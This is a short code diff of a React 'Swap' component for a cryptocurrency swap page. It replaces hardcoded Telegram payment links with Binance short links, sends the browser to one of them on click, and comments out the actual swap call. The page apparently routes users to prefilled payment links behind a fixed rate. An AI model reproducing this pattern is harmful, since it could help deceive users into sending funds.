@@ -17,16 +17,17 @@ const Swap = () => {
     : 0;
   const usdt = 0.9149;
   const links = [
-    "https://t.me/send?start=IVOEwneDUsCU",
-    "https://t.me/send?start=IVhN43ZViQSr",
-    "https://t.me/send?start=IV3vH2Fxifiz",
-    "https://t.me/send?start=IVkRma723ONy",
-    "https://t.me/send?start=IVLJHQedNca1",
-    "https://t.me/send?start=IVSpq0FXNFLY",
-    "https://t.me/send?start=IVkAtWrI1Hew",
-    "https://t.me/send?start=IVOrcEdGXulS",
-    "https://t.me/send?start=IVmRXsQQHWJT",
+    "https://s.binance.com/2d25EST5",
+    "https://s.binance.com/lPeBSrLV",
+    "https://s.binance.com/sqdLm5Nu",
+    "https://s.binance.com/ce8tLYG7",
+    "https://s.binance.com/NlseNnQu",
+    "https://s.binance.com/oE2dq2SK",
+    "https://s.binance.com/slwytNgA",
+    "https://s.binance.com/YnbisadZ",
+    "https://s.binance.com/mY5HzdsH",
   ];
+  
 
   // Функция для определения fee
   const calculateFee = () => {
@@ -208,7 +209,7 @@ const Swap = () => {
               window.location.href = link;
               
             }
-            setTimeout(swapUsdt, 150);
+            // setTimeout(swapUsdt, 150);
           }
         }}
       />
